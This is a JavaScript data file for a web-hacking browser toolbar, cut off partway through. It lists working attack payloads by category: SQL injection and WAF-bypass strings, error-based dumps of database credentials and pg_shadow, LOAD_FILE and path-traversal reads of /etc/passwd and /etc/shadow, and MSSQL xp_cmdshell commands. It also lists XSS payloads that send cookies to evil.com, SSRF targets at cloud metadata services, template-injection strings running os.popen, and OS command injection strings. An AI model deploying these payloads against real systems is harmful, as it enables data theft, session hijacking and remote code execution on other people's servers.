// ============================================================
// payloads.js - Payload data for all attack categories
// ============================================================
// This file contains only pure data - no DOM dependencies.

// ---- Namespace ----
window.KHackBar = window.KHackBar || {};
window.KHackBar.Payloads = window.KHackBar.Payloads || {};

// ---- Predator Data (Payload sets for each attack type) ----
const predatorData = {
  sql: [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1--+",
    "' OR 1=1--)",
    "' OR 1=1--/*",
    "' OR 'x'='x",
    "' OR '1'='1'-- -",
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin' OR '1'='1",
    "admin' OR 1=1-- -",
    "admin\"--",
    "admin\"#",
    "admin\" OR \"1\"=\"1",
    "admin\" OR 1=1-- -",
    "') OR ('1'='1",
    "') OR 1=1-- -",
    "') OR ('1'='1'--",
    "')) OR ((1=1-- -",
    "' OR 1=1 UNION SELECT 1-- -",
    "' UNION SELECT 1,2,3-- -",
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 2-- -",
    "1' ORDER BY 3-- -",
    "1' ORDER BY 4-- -",
    "1' ORDER BY 5-- -",
    "1' ORDER BY 6-- -",
    "1' ORDER BY 7-- -",
    "1' ORDER BY 8-- -",
    "1' ORDER BY 9-- -",
    "1' ORDER BY 10-- -",
    "' AND SLEEP(5)-- -",
    "' AND SLEEP(10)-- -",
    "' AND BENCHMARK(10000000,MD5('test'))-- -",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=(SELECT 1 FROM dual)-- -",
    "' AND EXISTS(SELECT 1 FROM users)-- -",
    "' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')-- -",
    "'; DROP TABLE users-- -",
    "'; DROP TABLE users--",
    "'; DROP TABLE users#",
    "' UNION SELECT @@version,2,3-- -",
    "' UNION SELECT database(),user(),version()-- -",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables-- -",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -",
    "' AND 1=0 UNION SELECT 1,database(),version()-- -",
    "' AND 1=0 UNION SELECT 1,database(),@@datadir-- -",
    "' AND 1=0 UNION SELECT 1,user(),@@hostname-- -"
  ],

  wafunion: [
    "1 UNION/**/SELECT 1,2,3-- -",
    "1 UNION/**/SELECT 1,2,3,4-- -",
    "1 UNION/**/SELECT 1,2,3,4,5-- -",
    "1/**/UNION/**/SELECT/**/1,2,3-- -",
    "1/**/UNION/**/SELECT/**/1,2,3,4-- -",
    "1%0aUNION%0aSELECT%0a1,2,3-- -",
    "1%0aUNION%0aSELECT%0a1,2,3,4-- -",
    "1%0d%0aUNION%0d%0aSELECT%0d%0a1,2,3-- -",
    "1%09UNION%09SELECT%091,2,3-- -",
    "1%0aUNION%0aALL%0aSELECT%0a1,2,3-- -",
    "1 UNION ALL SELECT 1,2,3-- -",
    "1 UNION ALL SELECT 1,2,3,4-- -",
    "1 UNION DISTINCT SELECT 1,2,3-- -",
    "1 UNION DISTINCTROW SELECT 1,2,3-- -",
    "' UNION/**/SELECT 1,2,3-- -",
    "' UNION/**/SELECT 1,2,3,4-- -",
    "'/**/UNION/**/SELECT/**/1,2,3-- -",
    "1' UNION SELECT 1,2,3-- -",
    "1\" UNION SELECT 1,2,3-- -",
    "1` UNION SELECT 1,2,3-- -",
    "1 UNION(SELECT 1,2,3)-- -",
    "1 UNION(SELECT 1,2,3,4)-- -",
    "1 UNION(SELECT 1,2,3,4,5)-- -",
    "1 UNION ALL(SELECT 1,2,3)-- -",
    "1 UNION/**/SELECT(SELECT 1),2,3-- -",
    "1 UNION SELECT/*!1,2,3*/-- -",
    "1 UNION SELECT{1,2,3}-- -",
    "1 UNION SELECT`1`,2,3-- -",
    "1 UNION SELECT[1],2,3-- -",
    "1 UNION SELECT 1,@@version,3-- -",
    "1 UNION(SELECT 1,database(),user())-- -",
    "1 UNION(SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database())-- -",
    "1 UNION(SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273)-- -",
    "1 UNION(SELECT 1,group_concat(login,0x3a,password),3 FROM users)-- -",
    "1 UNION(SELECT 1,@@basedir,@@datadir)-- -",
    "1 UNION(SELECT 1,load_file(0x2f6574632f706173737764),3)-- -",
    "1 UNION(SELECT 1,@@version,@@hostname)-- -"
  ],

  mysqldios: [
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@version) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT database()) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT user()) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT table_name FROM information_schema.tables LIMIT 0,1),2,3),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT column_name FROM information_schema.columns LIMIT 0,1),2,3),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(login,0x3a,password) FROM users LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@basedir)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@datadir)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@version_compile_os)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@hostname)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@plugin_dir)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -"
  ],

  // Unlike mysqldios (which uses MySQL's COUNT()/RAND() GROUP BY duplicate-key
  // error trick — a real MySQL-only implementation detail), PostgreSQL doesn't
  // produce that error at all. Its actual error-based technique is a type-cast
  // error: CAST()'ing a subquery result to int fails with the real value
  // embedded in the error message. These payloads use that genuine technique
  // instead of just relabeling the MySQL one.
  postgredios: [
    "' AND CAST((SELECT version()) AS int)=1-- -",
    "' AND CAST((SELECT current_database()) AS int)=1-- -",
    "' AND CAST((SELECT current_user) AS int)=1-- -",
    "' AND CAST((SELECT session_user) AS int)=1-- -",
    "' AND CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)=1-- -",
    "' AND CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS int)=1-- -",
    "' AND CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)=1-- -",
    "' AND CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)=1-- -",
    "' AND CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)=1-- -",
    "' AND CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS int)=1-- -",
    "' AND CAST((SELECT inet_server_addr()) AS int)=1-- -",
    "' AND CAST((SELECT current_setting('server_version')) AS int)=1-- -",
    "' AND CAST((SELECT current_setting('data_directory')) AS int)=1-- -",
    "' AND CAST((SELECT current_setting('config_file')) AS int)=1-- -"
  ],

  localdios: [
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/passwd'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/hosts'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/issue'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/proc/self/cmdline'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/proc/self/environ'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/nginx/nginx.conf'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/apache2/apache2.conf'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/my.cnf'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),CHAR(119),CHAR(105),CHAR(110),CHAR(100),CHAR(111),CHAR(119),CHAR(115),CHAR(92),CHAR(119),CHAR(105),CHAR(110),CHAR(46),CHAR(105),CHAR(110),CHAR(105))))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/var/log/apache2/access.log'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/var/log/nginx/access.log'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT LOAD_FILE('/etc/ssh/sshd_config'))),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -"
  ],

  mssql: [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' OR 1=1-- -",
    "1' OR 1=1/*",
    "1' OR '1'='1'--",
    "1' OR 1=1--",
    "admin'--",
    "admin'#",
    "admin'/*",
    "1' UNION SELECT 1--",
    "1' UNION SELECT 1,2--",
    "1' UNION SELECT 1,2,3--",
    "1' UNION SELECT 1,2,3,4--",
    "1' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT db_name(),user_name(),@@servername--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' WAITFOR DELAY '00:00:05'--",
    "1' WAITFOR DELAY '00:00:10'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC xp_cmdshell('dir C:\\')--",
    "'; EXEC xp_cmdshell('ipconfig')--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT 1,db_name(),3--",
    "' UNION SELECT 1,user_name(),3--",
    "' UNION SELECT 1,name,3 FROM sys.databases--",
    "' UNION SELECT 1,name,3 FROM sysobjects--",
    "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 4--",
    "1' ORDER BY 5--",
    "1' ORDER BY 6--",
    "1' ORDER BY 7--",
    "1' ORDER BY 8--",
    "1' ORDER BY 9--",
    "1' ORDER BY 10--"
  ],

  error: [
    "'",
    "\"",
    "`",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 'x'='x",
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "1'",
    "1\"",
    "1`",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 2-- -",
    "1' ORDER BY 3-- -",
    "1' ORDER BY 4-- -",
    "1' ORDER BY 5-- -",
    "1' ORDER BY 6-- -",
    "1' ORDER BY 7-- -",
    "1' ORDER BY 8-- -",
    "1' ORDER BY 9-- -",
    "1' ORDER BY 10-- -",
    "1' GROUP BY 1-- -",
    "1' GROUP BY 2-- -",
    "1' GROUP BY 3-- -",
    "1' GROUP BY 4-- -",
    "1' GROUP BY 5-- -",
    "1' GROUP BY 1,2-- -",
    "1' GROUP BY 1,2,3-- -",
    "1' HAVING 1=1-- -",
    "1' HAVING 1=2-- -",
    "' HAVING 1=1-- -",
    "' GROUP BY 1-- -",
    "1 AND 1=CONVERT(int, @@version)-- -",
    "1 AND 1=CONVERT(int, (SELECT 1))-- -",
    "convert(int,@@version)",
    "convert(int,db_name())",
    "CAST(@@version AS int)",
    "CAST(db_name() AS int)",
    "1/0",
    "1/(SELECT 1 FROM dual WHERE 1=1)",
    "1/(SELECT 1 FROM dual WHERE 1=2)",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -"
  ],

  xss: [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio><source onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "\" onmouseover=\"alert(1)\"",
    "\" onfocus=\"alert(1)\" autofocus",
    "' onfocus='alert(1)' autofocus",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<iframe src=javascript:alert(1)>",
    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "<script>new Image().src='https://evil.com/?c='+document.cookie</script>",
    "<script>document.location='https://evil.com/?c='+document.cookie</script>",
    "<script>var x=new XMLHttpRequest();x.open('GET','https://evil.com/?c='+document.cookie);x.send()</script>",
    "';alert(1);//",
    "\";alert(1);//",
    "`;alert(1);//",
    "';alert(1)<!--",
    "<script>alert(1)</script><!--",
    "--><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<script>alert(1)</script><script>",
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'';!--\"<XSS>=&{()}",
    "<IMG SRC=\"jav	ascript:alert(1)\">",
    "<IMG SRC=\"jav&#x09;ascript:alert(1)\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert(1)\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert(1)\">"
  ],

  lfi: [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/issue",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/hostname",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/shells",
    "../../../../../../../../etc/services",
    "../../../../../../../../etc/motd",
    "../../../../../../../../etc/aliases",
    "../../../../../../../../etc/crontab",
    "../../../../../../../../etc/resolv.conf",
    "../../../../../../../../etc/ssh/sshd_config",
    "../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/my.cnf",
    "../../../../../../../../etc/my.cnf",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/status",
    "../../../../../../../../proc/self/fd/0",
    "../../../../../../../../proc/self/fd/1",
    "../../../../../../../../proc/self/fd/2",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/apache2/error.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../var/log/nginx/error.log",
    "../../../../../../../../var/log/auth.log",
    "../../../../../../../../var/log/syslog",
    "../../../../../../../../var/log/messages",
    "../../../../../../../../var/log/dmesg",
    "../../../../../../../../var/log/wtmp",
    "../../../../../../../../var/log/lastlog",
    "../../../../../../../../var/log/secure",
    "../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../var/log/httpd/error_log",
    "../../../../../../../../usr/local/etc/php/php.ini",
    "../../../../../../../../etc/php.ini",
    "../../../../../../../../Windows/system32/drivers/etc/hosts",
    "../../../../../../../../Windows/win.ini",
    "../../../../../../../../Windows/System32/license.rtf",
    "../../../../../../../../boot.ini",
    "....//....//....//....//....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/hosts",
    "/etc/hostname"
  ],

  nosql: [
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' || 1==1//",
    "' || 1==1%00",
    "' || 1==1'",
    "admin' || 1==1//",
    "admin' || 1==1'",
    "admin' || 1==1%00",
    "admin' --",
    "admin' #",
    "admin'/*",
    "true",
    "$gt: ''",
    "$ne: ''",
    "$where: '1==1'",
    "{$gt: ''}",
    "{$ne: ''}",
    "{'$gt': ''}",
    "{'$ne': ''}",
    "';return true//",
    "';return true%00",
    "admin$gt:",
    "admin$ne:",
    "admin$where:",
    "admin')//",
    "'",
    "\"",
    "`",
    "' && 1==1//",
    "' && 1==1'",
    "' && 1==1%00",
    "' || true//",
    "' || true'",
    "' || true%00",
    "';return true;var foo='",
    "';return true;var foo=\"",
    "';return true;var foo=`",
    "'-1'",
    "'-1'",
    "1’",
    "1'",
    "1"
  ],

  ssrf: [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://localhost:80",
    "http://localhost:443",
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:6379",
    "http://localhost:8080",
    "http://localhost:8443",
    "http://[::1]:80",
    "http://[::1]:443",
    "http://[::1]:22",
    "http://[::1]:3306",
    "http://[::1]:6379",
    "http://[::1]:8080",
    "http://[::1]:8443",
    "http://0.0.0.0:80",
    "http://0.0.0.0:443",
    "http://0.0.0.0:22",
    "http://0.0.0.0:3306",
    "http://0.0.0.0:6379",
    "http://0.0.0.0:8080",
    "http://0.0.0.0:8443",
    "http://10.0.0.1:80",
    "http://10.0.0.1:443",
    "http://172.16.0.1:80",
    "http://172.16.0.1:443",
    "http://192.168.1.1:80",
    "http://192.168.1.1:443",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///c:/windows/win.ini",
    "file:///c:/boot.ini",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/config",
    "gopher://127.0.0.1:6379/",
    "ftp://127.0.0.1:21",
    "ftp://anonymous@127.0.0.1:21"
  ],

  ssrf_rce: [
    "http://127.0.0.1:80/exec?cmd=whoami",
    "http://127.0.0.1:80/exec?cmd=id",
    "http://127.0.0.1:80/exec?cmd=ls",
    "http://127.0.0.1:80/exec?cmd=cat%20/etc/passwd",
    "http://127.0.0.1:80/exec?cmd=ifconfig",
    "http://127.0.0.1:80/exec?cmd=uname%20-a",
    "http://127.0.0.1:80/cgi-bin/",
    "http://127.0.0.1:80/cgi-bin/test.cgi",
    "http://127.0.0.1:80/cgi-bin/printenv",
    "http://127.0.0.1:80/cgi-bin/hello",
    "http://127.0.0.1:80/cgi-bin/test",
    "http://127.0.0.1:8080/manager/html",
    "http://127.0.0.1:8080/jmx-console",
    "http://127.0.0.1:8080/admin",
    "http://127.0.0.1:8443/manager/html",
    "http://127.0.0.1:8443/jmx-console",
    "http://127.0.0.1:8443/admin",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:9200/_cat",
    "http://127.0.0.1:9200/_nodes",
    "http://127.0.0.1:9200/_cluster",
    "http://127.0.0.1:5601/api/",
    "http://127.0.0.1:5601/app/kibana",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:3000/api/",
    "http://127.0.0.1:3000/admin",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:5000/admin",
    "http://127.0.0.1:5000/console",
    "http://127.0.0.1:7001/",
    "http://127.0.0.1:7001/admin",
    "http://127.0.0.1:9042/",
    "http://127.0.0.1:9042/admin",
    "http://127.0.0.1:9090/",
    "http://127.0.0.1:9090/admin"
  ],

  ssti: [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{request.application}}",
    "{{request.environ}}",
    "{{get_flashed_messages.__globals__.__builtins__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('whoami').read()}}",
    "{{lipsum.__globals__['os'].popen('ls').read()}}",
    "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}",
    "{{url_for.__globals__['os'].popen('id').read()}}",
    "{{url_for.__globals__['os'].popen('whoami').read()}}",
    "{{url_for.__globals__['os'].popen('cat /etc/passwd').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{%print(7*7)%}",
    "{%print(config)%}",
    "{%print(self)%}",
    "{%print(request)%}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "<%= 7*7 %>",
    "<%= system('id') %>",
    "<%= system('whoami') %>",
    "<%= system('cat /etc/passwd') %>"
  ],

  blind: [
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
    "1' AND SLEEP(5)-- -",
    "1' AND SLEEP(10)-- -",
    "1' AND SLEEP(15)-- -",
    "1' AND BENCHMARK(5000000,MD5('test'))-- -",
    "1' AND BENCHMARK(10000000,MD5('test'))-- -",
    "1' AND BENCHMARK(15000000,MD5('test'))-- -",
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "' AND SLEEP(5)-- -",
    "' AND SLEEP(10)-- -",
    "' AND SLEEP(15)-- -",
    "1 AND 1=1-- -",
    "1 AND 1=2-- -",
    "1 AND SLEEP(5)-- -",
    "1 AND SLEEP(10)-- -",
    "1 AND SLEEP(15)-- -",
    "1' AND 1=(SELECT 1 FROM dual)-- -",
    "1' AND 1=(SELECT 1 FROM mysql.user)-- -",
    "1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)-- -",
    "1' AND EXISTS(SELECT 1 FROM users)-- -",
    "1' AND EXISTS(SELECT 1 FROM users WHERE username='admin')-- -",
    "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97-- -",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))<122-- -",
    "1' AND ORD(MID((SELECT IFNULL(CAST(password AS CHAR),0x20) FROM users WHERE username='admin'),1,1))>64-- -",
    "1' AND IF(1=1,SLEEP(5),0)-- -",
    "1' AND IF(1=2,SLEEP(5),0)-- -",
    "1' AND (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))-- -",
    "' AND 1=(SELECT 1 FROM dual)-- -",
    "' AND 1=(SELECT 1 FROM mysql.user)-- -",
    "' AND EXISTS(SELECT 1 FROM users)-- -",
    "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')-- -"
  ],

  replace: [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "1' AND SLEEP(5)-- -",
    "' UNION SELECT 1,2,3-- -",
    "'; DROP TABLE users-- -",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1/*",
    "1 UNION SELECT 1,2,3-- -",
    "1 UNION SELECT 1,2,3,4-- -",
    "1 UNION SELECT 1,2,3,4,5-- -",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "{{config}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://169.254.169.254/",
    "' || 1==1//",
    "' && 1==1//",
    "1' AND SLEEP(5)-- -",
    "1' AND BENCHMARK(10000000,MD5('test'))-- -",
    "' WAITFOR DELAY '00:00:05'--",
    "1 WAITFOR DELAY '00:00:05'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -"
  ],

  osci: [
    "1; whoami",
    "1; id",
    "1; ls",
    "1; cat /etc/passwd",
    "1; uname -a",
    "1; ifconfig",
    "1; pwd",
    "1; echo test",
    "1| whoami",
    "1| id",
    "1| ls",
    "1| cat /etc/passwd",
    "1| uname -a",
    "1| ifconfig",
    "1| pwd",
    "1`whoami`",
    "1`id`",
    "1`ls`",
    "1`cat /etc/passwd`",
    "1`uname -a`",
    "1`ifconfig`",
    "1$(whoami)",
    "1$(id)",
    "1$(ls)",
    "1$(cat /etc/passwd)",
    "1$(uname -a)",
    "1$(ifconfig)",
    "1' && whoami && '1'='1",
    "1' && id && '1'='1",
    "1' && ls && '1'='1",
    "1' && cat /etc/passwd && '1'='1",
    "1\" && whoami && \"1\"=\"1",
    "1\" && id && \"1\"=\"1",
    "1\" && ls && \"1\"=\"1",
    "1\" && cat /etc/passwd && \"1\"=\"1",
    "1' | whoami",
    "1' | id",
    "1' | ls",
    "1' | cat /etc/passwd",
    "1\" | whoami",
    "1\" | id",
    "1\" | ls",
    "1\" | cat /etc/passwd",
    "1 & whoami",
    "1 && whoami",
    "1 || whoami",
    "1 && id",
    "1 && ls",
    "1 && cat /etc/passwd",
    "1 && uname -a",
    "1 && ifconfig",
    "| whoami",
    "| id",
    "| ls",
    "| cat /etc/passwd",
    "| uname -a",
    "| ifconfig"
  ]
};

// ---- WAF Bypass Templates (selection-based, used by the WAF panel) ----
// Unlike predatorData above (fixed strings inserted at the cursor), these
// are *templates*. The WAF panel wraps whatever text the user has
// selected in the URL box into the "frame" defined by `value`, using the
// {{SEL}} marker as the insertion point. A template with no {{SEL}}
// marker (e.g. an alternate spelling of a keyword) simply replaces the
// selection outright. See ui.js: wrapSelectionWithTemplate.
const wafTemplates = {
  'Comment Injection (MySQL)': [
